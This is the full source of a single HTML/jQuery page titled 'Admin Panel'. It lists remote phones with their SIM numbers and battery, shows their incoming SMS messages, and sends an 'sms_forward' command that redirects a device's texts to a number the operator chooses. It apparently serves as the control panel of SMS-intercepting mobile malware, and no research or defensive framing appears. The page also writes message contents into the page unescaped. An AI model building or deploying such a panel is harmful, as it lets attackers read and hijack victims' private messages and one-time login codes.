<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
    <div class="container">
        <h1 class="mt-5">Admin Panel</h1>
        <div class="row">
            <div class="col-md-6">
                <h2>Connected Devices</h2>
                <ul id="devices-list" class="list-group"></ul>
            </div>
            <div class="col-md-6">
                <h2>SMS Messages</h2>
                <div id="sms-list"></div>
            </div>
        </div>
        <div class="row mt-5">
            <div class="col-md-12">
                <h2>Send Command</h2>
                <form id="command-form">
                    <div class="form-group">
                        <label for="device-select">Select Device</label>
                        <select class="form-control" id="device-select"></select>
                    </div>
                    <div class="form-group">
                        <label for="command-type">Command Type</label>
                        <select class="form-control" id="command-type">
                            <option value="sms_forward">SMS Forward</option>
                        </select>
                    </div>
                    <div id="sms-forward-options">
                        <div class="form-group">
                            <label for="sim-select">Select SIM</label>
                            <select class="form-control" id="sim-select">
                                <option value="1">SIM 1</option>
                                <option value="2">SIM 2</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="forward-number">Forward to Number</label>
                            <input type="text" class="form-control" id="forward-number" placeholder="Enter number">
                        </div>
                        <div class="form-group">
                            <label for="forward-action">Action</label>
                            <select class="form-control" id="forward-action">
                                <option value="on">On</option>
                                <option value="off">Off</option>
                            </select>
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Send Command</button>
                </form>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script>
        $(document).ready(function() {
            const API_BASE_URL = ''; // Set to empty string as frontend and backend are on the same domain

            function fetchDevices() {
                $.get(`${API_BASE_URL}/api/devices`, function(devices) {
                    let devicesList = '';
                    let deviceSelect = '';
                    for (const [uuid, device] of Object.entries(devices)) {
                        const online = (Date.now() - (device.lastSeen || 0) < 60000);
                        devicesList += `<li class="list-group-item" data-uuid="${uuid}">
                            <strong>Model:</strong> ${device.model || 'Unknown'}<br>
                            <strong>SIM1:</strong> ${device.sim1 || 'N/A'}<br>
                            <strong>SIM2:</strong> ${device.sim2 || 'N/A'}<br>
                            <strong>Battery:</strong> ${device.battery || 'N/A'}%<br>
                            <strong>Status:</strong> ${online ? 'Online' : 'Offline'}
                        </li>`;
                        deviceSelect += `<option value="${uuid}">${device.model || 'Unknown'}</option>`;
                    }
                    $('#devices-list').html(devicesList);
                    $('#device-select').html(deviceSelect);
                });
            }

            function fetchSms(uuid) {
                $.get(`${API_BASE_URL}/api/sms/${uuid}`, function(smsList) {
                    let smsHtml = '';
                    for (const sms of smsList) {
                        smsHtml += `<div class="card mt-2">
                            <div class="card-body">
                                <p><strong>From:</strong> ${sms.from}</p>
                                <p><strong>Body:</strong> ${sms.body}</p>
                                <p><strong>SIM:</strong> ${sms.sim}</p>
                                <p><strong>Timestamp:</strong> ${new Date(sms.timestamp).toLocaleString()}</p>
                            </div>
                        </div>`;
                    }
                    $('#sms-list').html(smsHtml);
                });
            }

            $('#devices-list').on('click', '.list-group-item', function() {
                const uuid = $(this).data('uuid');
                fetchSms(uuid);
            });

            $('#command-form').submit(function(e) {
                e.preventDefault();
                const uuid = $('#device-select').val();
                const commandType = $('#command-type').val();
                let command = {};

                if (commandType === 'sms_forward') {
                    command = {
                        type: 'sms_forward',
                        action: $('#forward-action').val(),
                        sim: $('#sim-select').val(),
                        number: $('#forward-number').val()
                    };
                }

                $.post(`${API_BASE_URL}/api/commands/${uuid}`, command, function() {
                    alert('Command sent!');
                });
            });

            fetchDevices();
            setInterval(fetchDevices, 5000);
        });
    </script>
</body>
</html>